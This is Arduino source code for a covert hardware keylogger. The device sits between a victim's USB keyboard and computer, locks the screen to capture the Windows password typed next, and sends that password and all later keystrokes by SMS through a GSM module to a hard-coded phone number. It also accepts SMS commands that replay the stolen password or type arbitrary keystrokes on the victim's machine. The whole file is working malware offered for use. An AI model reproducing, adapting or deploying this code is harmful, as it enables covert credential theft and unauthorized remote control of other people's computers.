#include <SoftwareSerial.h>            
#include <Keyboard.h>                  
#include "C_USBhost.h"                

C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/false);            
SoftwareSerial SMSSERIAL(8, 9);

#define CHAR_LIMIT 140                                
#define BAUD_RATE_SIM800L 57700                    
#define BAUD_RATE_USB_HOST_BOARD 115200             
#define BAUD_RATE_SERIAL 115200                    

char TextSms[CHAR_LIMIT+2];                  
int char_count;                              
char backupTextSms[CHAR_LIMIT+2];
unsigned long previousMillis=0;
int interval=3000;
int interval_payload=15000;
String SMS = "";
int passcached=0;
char password[127];
char empty;
int password_char_count;
byte b;
String substr = "";

void setup() {
  delay(1000);                                              
  Serial.begin(BAUD_RATE_SERIAL);                                                   
  SMSSERIAL.begin(BAUD_RATE_SIM800L);
  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
  Keyboard.begin();
  Keyboard.press(KEY_RIGHT_GUI);
  Keyboard.press('l');
  Keyboard.releaseAll();
                                            
}

void loop() {  
  unsigned long currentMillis = millis();
  b = USBhost.GetKey();        
//Get windows passmethod
  if( passcached == 0 && char_count > 0){
        while(b != 10){
         b = USBhost.GetKey();
         if(b){
          if(b == 8){
            if(password_char_count > 0){
              password_char_count--;
              password[password_char_count] = empty;
              }
            }
          else{
           password[password_char_count++] = (char)b;   
            }
          previousMillis = currentMillis;
          }
        }
      passcached++;
      SMSSERIAL.write("AT+CMGF=1\r\n");
      delay(2);
      SMSSERIAL.write("AT+CMGS=\"+31600000000\"\r\n"); //phonenumber with land code
      delay(2);
      SMSSERIAL.write(password); 
      SMSSERIAL.write((char)26);
    }
  
  //Normalkey capture
  if(b){
    if(b == 8){
      if(char_count > 0){
        char_count--;
        TextSms[char_count] = empty;
      }
    }
    else {
      TextSms[char_count++] = (char)b;
      }
    previousMillis = currentMillis;  
  }
  //SMS send
  if (char_count == CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && char_count > 5) {
      SMSSERIAL.write("AT+CMGF=1\r\n");
      delay(2);
      SMSSERIAL.write("AT+CMGS=\"+31600000000\"\r\n"); //phonenumber with land code
      delay(2);
      SMSSERIAL.write(TextSms); 
      SMSSERIAL.write((char)26);
      memset(TextSms, 0, sizeof(TextSms));
      char_count = 0; 
    } 

   //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
      if (SMSSERIAL.available() && (unsigned long)(currentMillis - previousMillis) >= interval_payload) {  
      SMS = SMSSERIAL.readString();    
      if(SMS.indexOf("Execute:Payload") > -1){
      Serial.print(password); // Payload
      Keyboard.press(KEY_HOME);
      Keyboard.releaseAll();
      delay(500);
      Keyboard.print(password);
      Keyboard.press('\n');
      Keyboard.releaseAll();
     }
     if(SMS.indexOf("Password:Reveal") > -1){ //Keyword
      SMSSERIAL.write("AT+CMGF=1\r\n");
      delay(2);
      SMSSERIAL.write("AT+CMGS=\"+31600000000\"\r\n"); //phonenumber with land code
      delay(2);
      SMSSERIAL.write(password); 
      SMSSERIAL.write((char)26);
      char_count = 0;
     }
     if(SMS.indexOf("Manual:") > -1){       
         substr = SMS.substring(57); //start from char 57 57 = : in Manual: 
         Keyboard.print(substr);
      }
    //Manual Password overwrite incase first entry was wrong.
     if(SMS.indexOf("ManualPass:") > -1){       
         substr = SMS.substring(61);
         substr.toCharArray(password, 127);
      } 
  } 
}
